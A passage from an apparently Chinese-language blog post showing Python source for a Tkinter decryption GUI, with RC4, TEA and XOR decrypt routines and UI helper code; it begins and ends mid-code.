language_">self</span>.status.config(text=<span class="string">&quot;🛑 错误: 密钥不能为空&quot;</span>)</span><br><span class="line">            messagebox.showerror(<span class="string">&quot;😢 错误&quot;</span>, <span class="string">&quot;密钥不能为空哦!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.status.config(text=<span class="string">f&quot;🔄 使用<span class="subst">&#123;self.get_algorithm_name(algorithm)&#125;</span>解密中...&quot;</span>)</span><br><span class="line">        threading.Thread(target=<span class="variable language_">self</span>._perform_decryption_thread, args=(ciphertext, key, algorithm), daemon=<span class="literal">True</span>).start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_perform_decryption_thread</span>(<span class="params">self, ciphertext, key, algorithm</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;在单独的线程中执行解密操作&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 根据算法调用相应的解密函数</span></span><br><span class="line">            <span class="keyword">if</span> algorithm == <span class="string">&quot;xor&quot;</span>:</span><br><span class="line">                result = xor_decrypt(ciphertext, key)</span><br><span class="line">            <span class="keyword">elif</span> algorithm == <span class="string">&quot;rc4&quot;</span>:</span><br><span class="line">                result = rc4_decrypt(ciphertext, key)</span><br><span class="line">            <span class="keyword">elif</span> algorithm == <span class="string">&quot;tea&quot;</span>:</span><br><span class="line">                result = tea_decrypt(ciphertext, key)</span><br><span class="line">            <span class="keyword">elif</span> algorithm == <span class="string">&quot;xtea&quot;</span>:</span><br><span class="line">                result = xtea_decrypt(ciphertext, key)</span><br><span class="line">            <span class="keyword">elif</span> algorithm == <span class="string">&quot;xxtea&quot;</span>:</span><br><span class="line">                result = xxtea_decrypt(ciphertext, key)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result = <span class="string">f&quot;🛑 不支持的算法: <span class="subst">&#123;algorithm&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="variable language_">self</span>.root.after(<span class="number">0</span>, <span class="variable language_">self</span>._update_decryption_result, result)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            error_msg = <span class="string">f&quot;🛑 解密过程中发生错误: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span></span><br><span class="line">            <span class="variable language_">self</span>.root.after(<span class="number">0</span>, <span class="variable language_">self</span>._update_decryption_error, error_msg)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_update_decryption_result</span>(<span class="params">self, result</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;更新解密结果&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;错误&quot;</span> <span class="keyword">in</span> result <span class="keyword">or</span> <span class="string">&quot;Error&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">            <span class="variable language_">self</span>.status.config(text=<span class="string">f&quot;😢 解密失败: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">            messagebox.showerror(<span class="string">&quot;😢 解密失败&quot;</span>, result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="variable language_">self</span>.status.config(text=<span class="string">&quot;🎉 解密成功!&quot;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.show_result(result)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_update_decryption_error</span>(<span class="params">self, error_msg</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;更新解密错误&quot;&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.status.config(text=error_msg)</span><br><span class="line">        messagebox.showerror(<span class="string">&quot;😢 错误&quot;</span>, error_msg)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">show_result</span>(<span class="params">self, plaintext</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;显示解密结果窗口（优化背景显示）&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result_window = tk.Toplevel(<span class="variable language_">self</span>.decrypt_window)</span><br><span class="line">            result_window.title(<span class="string">&quot;🎁 解密结果&quot;</span>)</span><br><span class="line">            result_window.geometry(<span class="string">&quot;500x300&quot;</span>)</span><br><span class="line">            result_window.resizable(<span class="literal">False</span>, <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">            bg = tk.Canvas(result_window, width=<span class="number">500</span>, height=<span class="number">300</span>, bg=<span class="string">&quot;#1a1a2e&quot;</span>)</span><br><span class="line">            bg.pack(fill=<span class="string">&quot;both&quot;</span>, expand=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">            title = UIBuilder.create_title(</span><br><span class="line">                bg,</span><br><span class="line">                <span class="string">&quot;解密成功!&quot;</span>,</span><br><span class="line">                font_size=<span class="number">18</span>,</span><br><span class="line">                emoji=<span class="string">&quot;🎉&quot;</span>,</span><br><span class="line">                bg=<span class="string">&quot;#1a1a2e&quot;</span></span><br><span class="line">            )</span><br><span class="line">            title.place(relx=<span class="number">0.5</span>, y=<span class="number">40</span>, anchor=tk.CENTER)</span><br><span class="line"></span><br><span class="line">            result_frame = tk.Frame(bg, bg=<span class="string">&quot;#2a2a3e&quot;</span>, bd=<span class="number">1</span>, relief=tk.SUNKEN)</span><br><span class="line">            result_frame.place(x=<span class="number">25</span>, y=<span class="number">70</span>, width=<span class="number">450</span>, height=<span class="number">180</span>)</span><br><span class="line"></span><br><span class="line">            scrollbar = ttk.Scrollbar(result_frame)</span><br><span class="line">            scrollbar.pack(side=tk.RIGHT, fill=tk.Y)</span><br><span class="line"></span><br><span class="line">            result_text = tk.Text(</span><br><span class="line">                result_frame,</span><br><span class="line">                bg=<span class="string">&quot;#2a2a3e&quot;</span>,</span><br><span class="line">                fg=<span class="string">&quot;white&quot;</span>,</span><br><span class="line">                font=(<span class="string">&quot;Consolas&quot;</span>, <span class="number">11</span>),</span><br><span class="line">                yscrollcommand=scrollbar.<span class="built_in">set</span>,</span><br><span class="line">                wrap=tk.WORD,</span><br><span class="line">                padx=<span class="number">10</span>,</span><br><span class="line">                pady=<span class="number">10</span></span><br><span class="line">            )</span><br><span class="line">            result_text.pack(fill=<span class="string">&quot;both&quot;</span>, expand=<span class="literal">True</span>)</span><br><span class="line">            result_text.insert(tk.END, plaintext)</span><br><span class="line">            result_text.config(state=tk.DISABLED)</span><br><span class="line">            scrollbar.config(command=result_text.yview)</span><br><span class="line"></span><br><span class="line">            close_btn = UIBuilder.create_button(</span><br><span class="line">                bg,</span><br><span class="line">                <span class="string">&quot;关闭&quot;</span>,</span><br><span class="line">                result_window.destroy,</span><br><span class="line">                bg=<span class="string">&quot;#4ECDC4&quot;</span>,</span><br><span class="line">                font_size=<span class="number">12</span></span><br><span class="line">            )</span><br><span class="line">            close_btn.place(relx=<span class="number">0.5</span>, y=<span class="number">260</span>, anchor=tk.CENTER)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            messagebox.showerror(<span class="string">&quot;😢 错误&quot;</span>, <span class="string">f&quot;无法显示结果: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">on_close</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;窗口关闭时停止视频播放&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(<span class="variable language_">self</span>, <span class="string">&#x27;video_bg&#x27;</span>) <span class="keyword">and</span> <span class="variable language_">self</span>.video_bg:</span><br><span class="line">            <span class="variable language_">self</span>.video_bg.stop_playback()</span><br><span class="line">        <span class="variable language_">self</span>.root.destroy()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># === 程序入口 ===</span></span><br><span class="line">DEBUG = <span class="literal">True</span>  <span class="comment"># 开发阶段设为True，发布时改为False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_app</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;运行应用程序&quot;&quot;&quot;</span></span><br><span class="line">    root = tk.Tk()</span><br><span class="line">    <span class="comment"># 设置窗口透明度（仅支持Windows和X11系统）</span></span><br><span class="line">    <span class="keyword">if</span> sys.platform <span class="keyword">in</span> [<span class="string">&#x27;win32&#x27;</span>, <span class="string">&#x27;linux&#x27;</span>]:</span><br><span class="line">        root.attributes(<span class="string">&#x27;-alpha&#x27;</span>, <span class="number">0.95</span>)  <span class="comment"># 95%透明度，保留视频背景效果</span></span><br><span class="line">    app = DecryptApp(root)</span><br><span class="line">    root.mainloop()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    run_app()</span><br></pre></td></tr></table></figure>

<p>beautiful.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tkinter <span class="keyword">as</span> tk</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UIBuilder</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;UI构建器，负责创建美化后的界面元素&quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_button</span>(<span class="params">parent, text, command, bg=<span class="string">&quot;#4ECDC4&quot;</span>, fg=<span class="string">&quot;white&quot;</span>, font_size=<span class="number">12</span>, emoji=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;创建美化的按钮&quot;&quot;&quot;</span></span><br><span class="line">        full_text = <span class="string">f&quot;<span class="subst">&#123;emoji&#125;</span> <span class="subst">&#123;text&#125;</span>&quot;</span> <span class="keyword">if</span> emoji <span class="keyword">else</span> text</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 安全的颜色调整函数</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">darken_color</span>(<span class="params">hex_color, factor=<span class="number">0.8</span></span>):</span><br><span class="line">            <span class="string">&quot;&quot;&quot;降低颜色亮度&quot;&quot;&quot;</span></span><br><span class="line">            hex_color = hex_color.lstrip(<span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">            rgb = <span class="built_in">tuple</span>(<span class="built_in">int</span>(hex_color[i:i+<span class="number">2</span>], <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> (<span class="number">0</span>, <span class="number">2</span>, <span class="number">4</span>))</span><br><span class="line">            darkened = <span class="built_in">tuple</span>(<span class="built_in">int</span>(<span class="built_in">max</span>(<span class="number">0</span>, <span class="built_in">min</span>(<span class="number">255</span>, c * factor))) <span class="keyword">for</span> c <span class="keyword">in</span> rgb)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;#<span class="subst">&#123;darkened[<span class="number">0</span>]:02x&#125;</span><span class="subst">&#123;darkened[<span class="number">1</span>]:02x&#125;</span><span class="subst">&#123;darkened[<span class="number">2</span>]:02x&#125;</span>&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> tk.Button(</span><br><span class="line">            parent,</span><br><span class="line">            text=full_text,</span><br><span class="line">            command=command,</span><br><span class="line">            font=(<span class="string">&quot;微软雅黑&quot;</span>, font_size, <span class="string">&quot;bold&quot;</span>),</span><br><span class="line">            bg=bg,</span><br><span class="line">            fg=fg,</span><br><span class="line">            activebackground=darken_color(bg),</span><br><span class="line">            relief=<span class="string">&quot;flat&quot;</span>,</span><br><span class="line">            padx=<span class="number">15</span>,</span><br><span class="line">            pady=<span class="number">5</span></span><br><span class="line">        )</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_label</span>(<span class="params">parent, text, font_size=<span class="number">12</span>, fg=<span class="string">&quot;white&quot;</span>, bg=<span class="string">&quot;#1a1a2e&quot;</span>, emoji=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;创建美化的标签&quot;&quot;&quot;</span></span><br><span class="line">        full_text = <span class="string">f&quot;<span class="subst">&#123;emoji&#125;</span> <span class="subst">&#123;text&#125;</span>&quot;</span> <span class="keyword">if</span> emoji <span class="keyword">else</span> text</span><br><span class="line">        <span class="keyword">return</span> tk.Label(</span><br><span class="line">            parent,</span><br><span class="line">            text=full_text,</span><br><span class="line">            font=(<span class="string">&quot;微软雅黑&quot;</span>, font_size),</span><br><span class="line">            fg=fg,</span><br><span class="line">            bg=bg</span><br><span class="line">        )</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_title</span>(<span class="params">parent, text, font_size=<span class="number">24</span>, fg=<span class="string">&quot;#4ECDC4&quot;</span>, bg=<span class="string">&quot;#1a1a2e&quot;</span>, emoji=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;创建美化的标题&quot;&quot;&quot;</span></span><br><span class="line">        full_text = <span class="string">f&quot;<span class="subst">&#123;emoji&#125;</span> <span class="subst">&#123;text&#125;</span> <span class="subst">&#123;emoji&#125;</span>&quot;</span> <span class="keyword">if</span> emoji <span class="keyword">else</span> text</span><br><span class="line">        <span class="keyword">return</span> tk.Label(</span><br><span class="line">            parent,</span><br><span class="line">            text=full_text,</span><br><span class="line">            font=(<span class="string">&quot;微软雅黑&quot;</span>, font_size, <span class="string">&quot;bold&quot;</span>),</span><br><span class="line">            fg=fg,</span><br><span class="line">            bg=bg</span><br><span class="line">        )</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_algorithm_info</span>(<span class="params">parent, algorithm</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;创建算法说明信息&quot;&quot;&quot;</span></span><br><span class="line">        info_text = &#123;</span><br><span class="line">            <span class="string">&quot;xor&quot;</span>: <span class="string">&quot;❌ XOR加密: 最简单的加密算法，通过逐字节异或运算实现&quot;</span>,</span><br><span class="line">            <span class="string">&quot;rc4&quot;</span>: <span class="string">&quot;🔒 RC4: 流加密算法，广泛用于网络协议如SSL/TLS&quot;</span>,</span><br><span class="line">            <span class="string">&quot;tea&quot;</span>: <span class="string">&quot;🍵 TEA: 小型加密算法，使用64位数据块和128位密钥&quot;</span>,</span><br><span class="line">            <span class="string">&quot;xtea&quot;</span>: <span class="string">&quot;🍵 XTEA: TEA的改进版本，修复了一些安全漏洞&quot;</span>,</span><br><span class="line">            <span class="string">&quot;xxtea&quot;</span>: <span class="string">&quot;🍵 XXTEA: 更安全的TEA变体，处理变长数据块&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> tk.Label(</span><br><span class="line">            parent,</span><br><span class="line">            text=info_text.get(algorithm, <span class="string">f&quot;❓ 未知算法: <span class="subst">&#123;algorithm&#125;</span>&quot;</span>),</span><br><span class="line">            font=(<span class="string">&quot;微软雅黑&quot;</span>, <span class="number">10</span>),</span><br><span class="line">            fg=<span class="string">&quot;#FF9F1C&quot;</span>,</span><br><span class="line">            bg=<span class="string">&quot;#1a1a2e&quot;</span></span><br><span class="line">        )</span><br></pre></td></tr></table></figure>

<p>rc4.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">ciphertext, key</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;RC4解密算法&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 转换密文为字节</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">all</span>(c <span class="keyword">in</span> <span class="string">&#x27;0123456789abcdefABCDEF&#x27;</span> <span class="keyword">for</span> c <span class="keyword">in</span> ciphertext) <span class="keyword">and</span> <span class="built_in">len</span>(ciphertext) % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            cipher_bytes = <span class="built_in">bytes</span>.fromhex(ciphertext)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cipher_bytes = ciphertext.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        key_bytes = key.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># RC4初始化</span></span><br><span class="line">        S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            j = (j + S[i] + key_bytes[i % <span class="built_in">len</span>(key_bytes)]) % <span class="number">256</span></span><br><span class="line">            S[i], S[j] = S[j], S[i]</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 生成密钥流并解密</span></span><br><span class="line">        i = j = <span class="number">0</span></span><br><span class="line">        decrypted = <span class="built_in">bytearray</span>()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> byte <span class="keyword">in</span> cipher_bytes:</span><br><span class="line">            i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">            j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">            S[i], S[j] = S[j], S[i]</span><br><span class="line">            k = S[(S[i] + S[j]) % <span class="number">256</span>]</span><br><span class="line">            decrypted.append(byte ^ k)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> decrypted.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">            <span class="keyword">return</span> decrypted.<span class="built_in">hex</span>()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;🛑 解密错误: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用示例</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 示例1: 解密十六进制格式的密文</span></span><br><span class="line">    ciphertext = <span class="string">&quot;730e7d1c4a1e&quot;</span>  <span class="comment"># 示例密文（十六进制）</span></span><br><span class="line">    key = <span class="string">&quot;key12345&quot;</span>             <span class="comment"># 密钥</span></span><br><span class="line">    plaintext = decrypt(ciphertext, key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;解密结果: <span class="subst">&#123;plaintext&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 示例2: 解密字符串格式的密文</span></span><br><span class="line">    ciphertext = <span class="string">&quot;encrypted_data&quot;</span>  <span class="comment"># 示例密文（字符串）</span></span><br><span class="line">    key = <span class="string">&quot;mysecretkey&quot;</span>            <span class="comment"># 密钥</span></span><br><span class="line">    plaintext = decrypt(ciphertext, key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;解密结果: <span class="subst">&#123;plaintext&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>tea.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt1</span>(<span class="params">ciphertext, key</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;TEA解密算法 - 修复32位无符号整数问题&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 确保密钥长度为16字节</span></span><br><span class="line">        key_bytes = key.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(key_bytes) &lt; <span class="number">16</span>:</span><br><span class="line">            key_bytes = key_bytes.ljust(<span class="number">16</span>, <span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">len</span>(key_bytes) &gt; <span class="number">16</span>:</span><br><span class="line">            key_bytes = key_bytes[:<span class="number">16</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 转换密文为字节</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">all</span>(c <span class="keyword">in</span> <span class="string">&#x27;0123456789abcdefABCDEF&#x27;</span> <span class="keyword">for</span> c <span class="keyword">in</span> ciphertext) <span class="keyword">and</span> <span class="built_in">len</span>(ciphertext) % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            cipher_bytes = <span class="built_in">bytes</span>.fromhex(ciphertext)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cipher_bytes = ciphertext.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 确保数据长度是8的倍数</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(cipher_bytes) % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">            padding = <span class="number">8</span> - (<span class="built_in">len</span>(cipher_bytes) % <span class="number">8</span>)</span><br><span class="line">            cipher_bytes += <span class="string">b&#x27;\0&#x27;</span> * padding</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 分块解密</span></span><br><span class="line">        decrypted = <span class="built_in">bytearray</span>()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(cipher_bytes), <span class="number">8</span>):</span><br><span class="line">            block = cipher_bytes[i:i + <span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 解包为两个32位无符号整数</span></span><br><span class="line">            v0 = <span class="built_in">int</span>.from_bytes(block[:<span class="number">4</span>], <span class="string">&#x27;big&#x27;</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            v1 = <span class="built_in">int</span>.from_bytes(block[<span class="number">4</span>:], <span class="string">&#x27;big&#x27;</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            k = [<span class="built_in">int</span>.from_bytes(key_bytes[i * <span class="number">4</span>:(i + <span class="number">1</span>) * <span class="number">4</span>], <span class="string">&#x27;big&#x27;</span>) &amp; <span class="number">0xFFFFFFFF</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line">            <span class="comment"># TEA解密过程</span></span><br><span class="line">            delta = <span class="number">0x9E3779B9</span></span><br><span class="line">            sum_val = (delta * <span class="number">32</span>) &amp; <span class="number">0xFFFFFFFF</span>  <span class="comment"># 确保初始值为32位无符号</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 辅助函数确保所有中间计算都在32位范围内</span></span><br><span class="line">            <span class="keyword">def</span> <span class="title function_">tea_op</span>(<span class="params">value, shift, add_val</span>):</span><br><span class="line">                <span class="string">&quot;&quot;&quot;确保移位和加法操作保持在32位范围内&quot;&quot;&quot;</span></span><br><span class="line">                <span class="keyword">if</span> shift &gt; <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">return</span> ((value &lt;&lt; shift) &amp; <span class="number">0xFFFFFFFF</span>) + add_val</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> ((value &gt;&gt; -shift) &amp; <span class="number">0xFFFFFFFF</span>) + add_val</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">                <span class="comment"># 分解计算步骤，确保每步都在32位范围内</span></span><br><span class="line">                term1 = tea_op(v0, <span class="number">4</span>, k[<span class="number">2</span>])</span><br><span class="line">                term2 = (v0 + sum_val) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">                term3 = tea_op(v0, -<span class="number">5</span>, k[<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line">                v1 = (v1 - ((term1 ^ term2) ^ term3)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">                term1 = tea_op(v1, <span class="number">4</span>, k[<span class="number">0</span>])</span><br><span class="line">                term2 = (v1 + sum_val) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">                term3 = tea_op(v1, -<span class="number">5</span>, k[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">                v0 = (v0 - ((term1 ^ term2) ^ term3)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">                sum_val = (sum_val - delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 再次确保v0和v1为非负数</span></span><br><span class="line">            v0 &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line">            v1 &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 打包解密结果（添加额外检查）</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                decrypted_block = v0.to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>) + v1.to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span> OverflowError:</span><br><span class="line">                <span class="comment"># 作为备用方案，直接处理32位值</span></span><br><span class="line">                decrypted_block = (v0 &amp; <span class="number">0xFFFFFFFF</span>).to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>) + (v1 &amp; <span class="number">0xFFFFFFFF</span>).to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            decrypted.extend(decrypted_block)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 尝试UTF-8解码，失败则返回HEX</span></span><br><span class="line">            <span class="keyword">return</span> decrypted.decode(<span class="string">&#x27;utf-8&#x27;</span>).rstrip(<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">            <span class="keyword">return</span> decrypted.<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;🛑 解密错误: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span></span><br><span class="line"><span class="comment"># 使用示例</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 示例1: 解密十六进制格式的密文</span></span><br><span class="line">    ciphertext = <span class="string">&quot;0123456789abcdef&quot;</span>  <span class="comment"># 示例密文（十六进制）</span></span><br><span class="line">    key = <span class="string">&quot;1234567890123456&quot;</span>        <span class="comment"># 16字节密钥</span></span><br><span class="line">    plaintext = decrypt(ciphertext, key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;解密结果: <span class="subst">&#123;plaintext&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 示例2: 解密字符串格式的密文</span></span><br><span class="line">    ciphertext = <span class="string">&quot;encrypted_data&quot;</span>    <span class="comment"># 示例密文（字符串）</span></span><br><span class="line">    key = <span class="string">&quot;mysecretkey1234&quot;</span>          <span class="comment"># 16字节密钥</span></span><br><span class="line">    plaintext = decrypt(ciphertext, key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;解密结果: <span class="subst">&#123;plaintext&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>xor1.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># xor1.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_encrypt_decrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    执行异或加密或解密操作。</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    :param data: 原始数据（字符串或 bytes）</span></span><br><span class="line"><span class="string">    :param key: 密钥（字符串或 bytes）</span></span><br><span class="line"><span class="string">    :return: 加密或解密后的 bytes 数据</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(data, <span class="built_in">str</span>):</span><br><span class="line">        data = data.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(key, <span class="built_in">str</span>):</span><br><span class="line">        key = key.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    result = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        key_byte = key[i % <span class="built_in">len</span>(key)]</span><br><span class="line">        result.append(data[i] ^ key_byte)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_decrypt</span>(<span class="params">ciphertext, key</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    解密并返回可读格式。</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    优先尝试将结果解码为 